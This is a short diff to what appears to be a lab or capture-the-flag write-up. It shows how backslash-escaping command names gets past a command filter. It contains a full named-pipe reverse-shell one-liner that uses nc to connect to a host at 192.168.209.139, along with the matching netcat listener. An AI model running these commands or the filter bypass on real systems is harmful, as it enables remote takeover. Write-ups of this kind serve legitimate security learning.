@@ -82,7 +82,13 @@ But if we use `\` with command `l\s` then it doesn't filters it.
 
 ![[Pasted image 20260209225434.png]]
 
-but 
+But before executing the command we simply make rm > r\m .
 ```
 r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.209.139 8888 >/tmp/f
 ```
+
+```
+nc -lvnp 8888
+```
+
+![[Pasted image 20260209225622.png]]
